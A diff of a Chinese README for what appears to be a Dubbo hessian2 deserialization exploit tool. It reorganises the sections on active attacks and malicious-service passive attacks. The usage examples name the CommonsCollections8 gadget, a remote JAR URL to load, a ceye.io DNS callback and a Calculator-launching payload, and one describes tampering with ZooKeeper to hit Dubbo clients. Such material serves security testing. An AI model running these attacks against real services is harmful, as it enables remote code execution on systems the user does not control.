@@ -90,7 +90,7 @@ JAR=http://127.0.0.1:8080/R.jar,Calc
 DNS=http://xxxx.ceye.io
 ```
 ### 2、特定gadget检测
-#### 2.1、恶意服务-被动攻击
+#### 2.1、主动攻击
 例（测试dubbo默认缺省情况下使用的dubbo协议+hessian2反序列化）：
 ```
 
@@ -119,6 +119,7 @@ CommonsCollections8
 --args
 /System/Applications/Calculator.app/Contents/MacOS/Calculator
 ```
+#### 2.2、恶意服务-被动攻击
 例（使用恶意服务攻击dubbo客户端）：
 ```
 -e
@@ -130,10 +131,10 @@ CommonsCollections8
 java
 --gadget
 CommonsCollections8
--f
-/Users/xuanyonghao/security/java/my-project/dubbo-exp/check.data
+--args
+/System/Applications/Calculator.app/Contents/MacOS/Calculator
 ```
-#### 2.2、主动攻击
+#### 2.3、恶意服务-主动攻击
 例（使用恶意服务并主动篡改zookeeper，主动攻击dubbo客户端）：
 ```
 -e
